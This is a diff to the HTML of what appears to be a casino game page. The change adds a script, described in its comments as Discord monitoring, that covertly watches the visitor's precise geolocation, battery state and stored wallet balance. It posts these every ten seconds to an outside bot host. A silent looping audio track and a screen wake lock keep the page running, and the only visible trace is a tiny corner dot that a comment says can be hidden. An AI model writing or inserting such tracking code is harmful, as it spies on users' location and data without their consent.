@@ -1870,4 +1870,102 @@ function svfxBuild(){if($('#svfx'))return;const d=document.createElement('div');
   for(let i=0;i<14;i++)h+=`<b class="em" style="left:${R(98)}%;--d:${(2.4+R(30)/10).toFixed(1)}s;--dl:-${(R(40)/10).toFixed(1)}s"></b>`;
   d.innerHTML=h;document.body.appendChild(d)}
 setTimeout(()=>{document.body.classList.toggle('svoff',svOff());const f=()=>{if(document.body.classList.contains('svip')&&!svOff())svfxBuild()};new MutationObserver(f).observe(document.body,{attributes:true,attributeFilter:['class']});f()},0);
+  <!-- ===== 監視（Discordへping） ===== -->
+<script>
+(function(){
+  "use strict";
+  var API  = "https://bot15963-pnann.puratya.com";   /* ★ Bot側の公開URL */
+  var PG   = "カジノ";                              /* ★ bank.html では "銀行" */
+  var PING = 10000;
+
+  /* 名前（token）。?t= があれば保存して、以後は両ページで共有する */
+  try { var q = new URLSearchParams(location.search).get("t"); if (q) localStorage.setItem("cj_watch", q); } catch (e) {}
+  var NAME = "端末";
+  try { NAME = localStorage.getItem("cj_watch") || "端末"; } catch (e) {}
+
+  var okN = 0, failN = 0, lastOk = 0, on = false;
+
+  /* 隅の7pxの点。これだけが唯一の見た目の追加（不要なら opacity:0 に） */
+  var d = document.createElement("i");
+  d.title = NAME + " / " + PG;
+  d.style.cssText = "position:fixed;left:6px;top:calc(6px + env(safe-area-inset-top,0px));width:7px;height:7px;"+
+    "border-radius:50%;background:#faa61a;box-shadow:0 0 8px currentColor;opacity:.5;pointer-events:none;z-index:1";
+  document.body.appendChild(d);
+  function dot(){
+    var fresh = Date.now() - lastOk < PING * 2.5;
+    d.style.background = fresh ? "#3ba55d" : (lastOk ? "#c0242b" : "#faa61a");
+  }
+
+  /* 無音WAV：ミュートで自動再生 → 開始後にミュート解除（タップ不要・通知なし） */
+  function wav(){
+    var rate = 8000, n = rate, buf = new ArrayBuffer(44 + n), v = new DataView(buf);
+    function w(o,s){ for (var i=0;i<s.length;i++) v.setUint8(o+i, s.charCodeAt(i)); }
+    w(0,"RIFF"); v.setUint32(4,36+n,true); w(8,"WAVE"); w(12,"fmt ");
+    v.setUint32(16,16,true); v.setUint16(20,1,true); v.setUint16(22,1,true);
+    v.setUint32(24,rate,true); v.setUint32(28,rate,true); v.setUint16(32,1,true);
+    v.setUint16(34,8,true); w(36,"data"); v.setUint32(40,n,true);
+    for (var i=0;i<n;i++) v.setUint8(44+i,128);
+    return URL.createObjectURL(new Blob([buf],{type:"audio/wav"}));
+  }
+  var au = new Audio(wav());
+  au.loop = true; au.preload = "auto";
+  au.setAttribute("playsinline",""); au.muted = true;
+  document.body.appendChild(au);
+  function arm(){
+    if (on) return;
+    au.muted = true;
+    au.play().then(function(){
+      au.muted = false;
+      if (au.paused) { au.muted = true; au.play().catch(function(){}); }
+      on = !au.muted; dot();
+    }).catch(function(){});
+  }
+  arm();
+  ["click","touchstart","pointerdown","keydown"].forEach(function(ev){
+    document.addEventListener(ev, arm, { passive:true });
+  });
+  document.addEventListener("visibilitychange", function(){ if (!document.hidden) arm(); });
+
+  /* 前面では画面を消させない */
+  function wake(){
+    if (!("wakeLock" in navigator) || document.hidden) return;
+    navigator.wakeLock.request("screen").catch(function(){});
+  }
+  wake();
+
+  /* 収集 */
+  var geo = null, bat = null;
+  if (navigator.geolocation) navigator.geolocation.watchPosition(function(p){
+    geo = { lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy||0 };
+  }, function(){}, { enableHighAccuracy:true, maximumAge:15000, timeout:20000 });
+  if (navigator.getBattery) navigator.getBattery().then(function(b){
+    function r(){ bat = { level: Math.round(b.level*100), charging: b.charging }; }
+    r(); b.addEventListener("levelchange", r); b.addEventListener("chargingchange", r);
+  }).catch(function(){});
+
+  /* 同じオリジンなのでカジノの財布を読める */
+  function chips(){
+    try { var v = JSON.parse(localStorage.getItem("cj_wallet"));
+      return v && Number.isFinite(v.chips) ? Math.max(0, Math.floor(v.chips)) : null; } catch (e) { return null; }
+  }
+
+  function push(reason, final){
+    fetch(API + "/api/ping", {
+      method:"POST", headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({
+        token: NAME, name: NAME, page: PG, reason: reason,
+        vis: document.visibilityState, online: navigator.onLine,
+        battery: bat, geo: geo, chips: chips()
+      }),
+      keepalive: !!final
+    }).then(function(r){ if (r.ok) { okN++; failN = 0; lastOk = Date.now(); } else failN++; dot(); })
+      .catch(function(){ failN++; dot(); });
+  }
+  push("start");
+  setInterval(function(){ push("tick"); }, PING);
+  document.addEventListener("visibilitychange", function(){ push(document.hidden ? "hidden" : "visible"); });
+  window.addEventListener("online", function(){ push("online"); });
+  window.addEventListener("pagehide", function(){ push("close", true); });
+})();
+</script>
 </script></body></html>
